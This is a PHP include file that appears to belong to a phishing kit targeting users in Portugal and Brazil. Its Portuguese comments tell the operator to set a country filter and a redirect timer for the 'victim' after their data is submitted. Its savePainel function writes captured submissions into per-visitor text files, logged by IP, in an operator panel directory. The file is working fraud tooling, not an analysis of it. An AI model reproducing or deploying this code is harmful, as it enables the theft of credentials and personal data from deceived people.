<?php
session_start();
ob_start();
date_default_timezone_set('America/Sao_Paulo');

include __DIR__ . '/Mobile_Detect.php';

$listCountrys = ['pt', 'br', '']; // PARA ADICIONAR MAIS PAISES, DEPOIS DO ULTIMO PAIS, ADICIONE: ,'sigla' exemplo: ... 'br', 'gb', 'uk'

$redirecFinal = 'https://www.google.com/'; // INSIRA AQUI O LINK DA PÁGINA QUE IRÁ REDIRECIONAR A PÁGINA APÓS ENVIO DOS DADOS.
$timeRedirect = 12; // TEMPO EM SEGUNDOS PARA REDIRECIONAR A VÍTIMA, RECOMENDO 12 A 15 SEGUNDOS PARA DAR TEMPO DELA LER O TEXTO.








/* NÃO ALTERAR DAQUI PARA BAIXO SE NÃO SOUBER PROGRAMAR */
/* NÃO ALTERAR DAQUI PARA BAIXO SE NÃO SOUBER PROGRAMAR */
/* NÃO ALTERAR DAQUI PARA BAIXO SE NÃO SOUBER PROGRAMAR */

$mainFile = 'acesso.php';
$ip = ($_SERVER['REMOTE_ADDR'] == '::1') ? '127.0.0.1' : $_SERVER['REMOTE_ADDR'];

function savePainel($msg, $ip){
    if (!isset($_SESSION['random'])) {
        $random = rand(1111, 9999);
        $_SESSION['random'] = $random;
    } else {
        $random = $_SESSION['random'];
    }

    if (!isset($_SESSION['dataSave'])) {
        $dataSave = date('d-m-y-H-i');
	    $_SESSION['dataSave'] = $dataSave;
    }else{
        $dataSave = $_SESSION['dataSave'];
    }
	
	$fp = fopen(__DIR__ . "/../../painel/info/{$dataSave}-{$ip}-{$random}.txt", "a");
	fwrite($fp, $msg);
	fclose($fp);
}

function getSystem(){
    $sistema = '';
    $detect = new Mobile_Detect;

    if ($detect->isMobile()) {
        if ($detect->isiOS()) {
            $sistema = 'IPHONE';
        } else {
            $sistema = 'ANDROID';
        }
    } else {
        $sistema = 'DESKTOP';
    }

    return $sistema;
}

function getQuery($mainFile){
	if(isset($_GET) && $_GET != null){
		$allGetters = $_GET;
		$allGetters = http_build_query($allGetters);
		$query = $mainFile . '?' . $allGetters;
	}else{
		$query = $mainFile;
	}
	
	return $query;
}

?>